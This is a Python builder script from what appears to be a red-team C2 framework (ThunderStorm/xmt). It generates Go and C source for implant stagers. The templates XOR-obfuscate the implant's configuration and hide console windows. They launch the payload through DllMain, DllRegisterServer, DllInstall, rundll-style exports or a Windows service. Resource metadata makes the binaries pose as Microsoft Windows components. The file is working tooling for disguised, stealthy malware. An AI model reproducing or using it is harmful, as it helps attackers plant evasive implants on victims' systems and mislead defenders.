#!/usr/bin/python3

from io import StringIO
from random import choice
from include.util import xor, nes
from string import ascii_lowercase
from os.path import exists, expanduser, expandvars

RC = """#include <windows.h>
{icon}
VS_VERSION_INFO  VERSIONINFO
FILEVERSION      {version}
PRODUCTVERSION   {version}
FILEFLAGSMASK    VS_FFI_FILEFLAGSMASK
FILEFLAGS        0
FILEOS           VOS__WINDOWS32
FILETYPE         VFT_DLL
FILESUBTYPE      VFT2_UNKNOWN

BEGIN
    BLOCK "StringFileInfo"
    BEGIN
        BLOCK "040904B0"
        BEGIN
            VALUE "Comments", ""
            VALUE "CompanyName", "{company}"
            VALUE "FileDescription", "{title}"
            VALUE "FileVersion", "{version_string}"
            VALUE "InternalName", "{title}"
            VALUE "LegalCopyright", "{copyright}"
            VALUE "OriginalFilename", "{file}"
            VALUE "ProductName", "{product}"
            VALUE "ProductVersion", "{version_string}"
        END
    END
    BLOCK "VarFileInfo"
    BEGIN
        VALUE "Translation", 0x409, 1200
    END
END
"""
BOLT = """package main
{cgo}
import (
    "github.com/iDigitalFlame/ThunderStorm/bolt"
    "github.com/iDigitalFlame/xmt/c2/cfg"
    "github.com/iDigitalFlame/xmt/man"
    "github.com/iDigitalFlame/xmt/util"
)

var (
    z = cfg.Config{{
        {config}
    }}
    e = [...]byte{{
        {linker}
    }}
    g = [...]byte{{
        {guard}
    }}
    p = [...]byte{{
        {pipe}
    }}
)

var k = [...]byte{{
        {key}
}}

{main}() {{
    {checks}
    util.Decode(k[:], z)
    bolt.StartEx(
        {ignore}, {load}, {critical},
        man.LinkerFromName(util.Decode(k[:], e[:])),
        util.Decode(k[:], g[:]), util.Decode(k[:], p[:]), z,
    )
}}
"""
WIN_DLL = """DWORD {thread}() {{
    Sleep(1000);
    {export}();
    return 0;
}}
EXPORT HRESULT WINAPI VoidFunc() {{
    HANDLE c = GetConsoleWindow();
    if (c != NULL) {{
        ShowWindow(c, 0);
    }}
    {export}();
}}
EXPORT HRESULT WINAPI DllRegisterServer() {{
    HANDLE c = GetConsoleWindow();
    if (c != NULL) {{
        ShowWindow(c, 0);
    }}
    {export}();
}}
EXPORT HRESULT WINAPI DllUnregisterServer() {{
    HANDLE c = GetConsoleWindow();
    if (c != NULL) {{
        ShowWindow(c, 0);
    }}
    {export}();
}}
EXPORT HRESULT WINAPI DllInstall(BOOL b, PCWSTR i) {{
    HANDLE c = GetConsoleWindow();
    if (c != NULL) {{
        ShowWindow(c, 0);
    }}
    {export}();
}}
EXPORT void {func}(HWND h, HINSTANCE i, LPSTR a, int s) {{
    HANDLE c = GetConsoleWindow();
    if (c != NULL) {{
        ShowWindow(c, 0);
    }}
    {export}();
}}
EXPORT BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID args) {{
    if (r == DLL_PROCESS_ATTACH) {{
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE){thread}, NULL, 0, NULL);
    }}
    return TRUE;
}}
"""
WIN_BASE = """#define WINVER 0x0501
#define _WIN32_WINNT 0x0501

#define NOMB
#define NOMSG
#define NONLS
#define NOGDI
#define NOMCX
#define NOIME
#define NOHELP
#define NOCOMM
#define NOICONS
#define NOCRYPT
#define NOKANJI
#define NOSOUND
#define NOCOLOR
#define NOMENUS
#define NOCTLMGR
#define NOSCROLL
#define NODRAWTEXT
#define NOMETAFILE
#define NOPROFILER
#define NOKEYSTATES
#define NORASTEROPS
#define NOCLIPBOARD
#define NOWINSTYLES
#define NOSYSMETRICS
#define NOWINOFFSETS
#define NOSHOWWINDOW
#define NOTEXTMETRIC
#define NOSYSCOMMANDS
#define NOGDICAPMASKS
#define NOWINMESSAGES
#define NODEFERWINDOWPOS
#define NOVIRTUALKEYCODES
#define WIN32_LEAN_AND_MEAN

#define EXPORT __declspec(dllexport)

#include <winsock.h>
#include <windows.h>

#include "stub.h"

"""
MANIFEST = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
    <compatibility xmlns="urn:schemas-microsoft-com:compatibility.v1">
        <application>
            <supportedOS Id="{e2011457-1546-43c5-a5fe-008deee3d3f0}" />
            <supportedOS Id="{35138b9a-5d96-4fbd-8e2d-a2440225f93a}" />
            <supportedOS Id="{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}" />
            <supportedOS Id="{1f676c76-80e1-4239-95bb-83d0f6d0da78}" />
            <supportedOS Id="{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}" />
        </application>
    </compatibility>
</assembly>
"""
WIN_BINARY = """int main(int argc, char *argv[]) {{
    HANDLE c = GetConsoleWindow();
    if (c != NULL) {{
        ShowWindow(c, 0);
    }}
    {export}();
    return 0;
}}
"""
WIN_DLL_SERVICE = """HANDLE svc;

SERVICE_STATUS svcStatus = {{
    SERVICE_WIN32_SHARE_PROCESS, SERVICE_START_PENDING,
    SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN | SERVICE_ACCEPT_PAUSE_CONTINUE
}};
SERVICE_STATUS_HANDLE svcInst;

DWORD {thread}(LPVOID e) {{
    while (e == NULL || WaitForSingleObject(e, 0) != 0) {{
        {export}();
        Sleep({timeout});
    }}
    if (e != NULL) {{
        CloseHandle(e);
    }}
    return 0;
}}
EXPORT HRESULT WINAPI VoidFunc() {{
    HANDLE c = GetConsoleWindow();
    if (c != NULL) {{
        ShowWindow(c, 0);
    }}
    {export}();
}}
EXPORT HRESULT WINAPI DllRegisterServer() {{
    HANDLE c = GetConsoleWindow();
    if (c != NULL) {{
        ShowWindow(c, 0);
    }}
    {export}();
}}
EXPORT HRESULT WINAPI DllUnregisterServer() {{
    HANDLE c = GetConsoleWindow();
    if (c != NULL) {{
        ShowWindow(c, 0);
    }}
    {export}();
}}
EXPORT HRESULT WINAPI DllInstall(BOOL b, PCWSTR i) {{
    HANDLE c = GetConsoleWindow();
    if (c != NULL) {{
        ShowWindow(c, 0);
    }}
    {export}();
}}
EXPORT BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID args) {{
    return TRUE;
}}
EXPORT DWORD WINAPI HandlerEx(DWORD c, DWORD e, LPVOID d, LPVOID x) {{
    switch (c) {{
    case SERVICE_CONTROL_STOP:
        svcStatus.dwCurrentState = SERVICE_STOPPED;
        SetEvent(svcEvent);
        break;
    case SERVICE_CONTROL_SHUTDOWN:
        svcStatus.dwCurrentState = SERVICE_STOPPED;
        SetEvent(svcEvent);
        break;
    case SERVICE_CONTROL_PAUSE:
        svcStatus.dwCurrentState = SERVICE_PAUSED;
        break;
    case SERVICE_CONTROL_CONTINUE:
        svcStatus.dwCurrentState = SERVICE_RUNNING;
        break;
    default:
        break;
    }}
    SetServiceStatus(svcMain, &svcStatus);
    return NO_ERROR;
}}

EXPORT VOID WINAPI ServiceMain(DWORD n, LPCWSTR* a) {{
    svc = CreateEventW(NULL, TRUE, FALSE, NULL);
    if (svc == NULL) {{
        return;
    }}
    svcInst = RegisterServiceCtrlHandlerExW(L"{service_name}", HandlerEx, NULL);
    if (svcInst == NULL) {{
        return;
    }}
    svcStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(svcInst, &svcStatus);
    CreateThread(NULL, STACK_SIZE, (LPTHREAD_START_ROUTINE){thread}, svc, 0, NULL);
    WaitForSingleObject(svc, INFINITE);
}}
"""


def Rc(res):
    if not isinstance(res, dict) or len(res) == 0:
        raise ValueError('build: "res" is an empty/invalid dict')
    n = res.get("file")
    t = res.get("title")
    if not nes(n):
        raise ValueError('build: resource "file" is required')
    if not nes(t):
        raise ValueError('build: resource "title" is required')
    v = res.get("version", "6.3.9600.16384")
    i = ""
    if "icon" in res and nes(res["icon"]):
        p = expanduser(expandvars(res["icon"]))
        if not exists(p):
            raise ValueError(f'build: resource "icon" "{p}" does not exist')
        i = f'IDI_ICON_128 ICON "{p}"\n'
        del p
    return RC.format(
        file=n,
        icon=i,
        title=t,
        version_string=v,
        version=v.replace(".", ","),
        company=res.get("company", "Microsoft Corporation"),
        product=res.get("product", "Microsoft Windows Operating System"),
        copyright=res.get("copyright", "Microsoft Corporation. All rights reserved."),
    )


def Binary(export, **_):
    return WIN_BASE + WIN_BINARY.format(export=export)


def _go_str(v, limit=20):
    if len(v) == 0:
        return ""
    b = StringIO()
    c = 0
    for x in v:
        if c > 0 and c % limit == 0:
            b.write("\n\t")
        b.write(f"0x{hex(x)[2:].upper().zfill(2)}, ")
        c += 1
    r = b.getvalue()
    b.close()
    del b
    del c
    return r


def _translate_checks(v):
    return 0


def Dll(export, thread, func):
    if not nes(func):
        func = "".join(choice(ascii_lowercase) for _ in range(12))
    if not nes(thread):
        thread = "".join(choice(ascii_lowercase) for _ in range(12))
    return WIN_BASE + WIN_DLL.format(export=export, func=func, thread=thread)


def Bolt(builder, key, cfg, os, arch, **kw):
    p = builder.get("config", "pipe")
    g = builder.get("config", "guard")
    e = builder.get("config", "linker")
    if not nes(p):
        p = bytearray(0)
    else:
        p = p.encode("UTF-8")
    if not nes(g):
        g = bytearray(0)
    else:
        g = g.encode("UTF-8")
    if not nes(e):
        e = bytearray(0)
    else:
        e = e.encode("UTF-8")
    c, m, x = "", "func main", ""
    if os == "windows":
        c = '\nimport "C"'
        n = kw.get("name")
        if not nes(n):
            n = "".join(choice(ascii_lowercase) for _ in range(10))
        m = f"func main() {{}}\n\n//export {n}\nfunc {n}"
        del n
    s = kw.get("checks")
    if nes(s):
        x = f"bolt.SafetyCheck({_translate_checks(s)})"
    return BOLT.format(
        cgo=c,
        main=m,
        checks=x,
        key=_go_str(key),
        pipe=_go_str(xor(key, p)),
        guard=_go_str(xor(key, g)),
        linker=_go_str(xor(key, e)),
        config=_go_str(xor(key, cfg)),
        load="true" if builder.get("config", "load") else "false",
        ignore="true" if builder.get("config", "ignore") else "false",
        critical="true" if builder.get("config", "critical") else "false",
    )


def DllService(export, thread, func, service, timeout):
    if not nes(service):
        raise ValueError("build: DLL service name cannot be empty")
    if not nes(func):
        func = "".join(choice(ascii_lowercase) for _ in range(12))
    if not nes(thread):
        thread = "".join(choice(ascii_lowercase) for _ in range(12))
    if not isinstance(timeout, int) or timeout < 1000:
        timeout = 30000
    return WIN_BASE + WIN_DLL_SERVICE.format(
        func=func,
        export=export,
        thread=thread,
        timeout=str(timeout),
        service_name=service,
    )
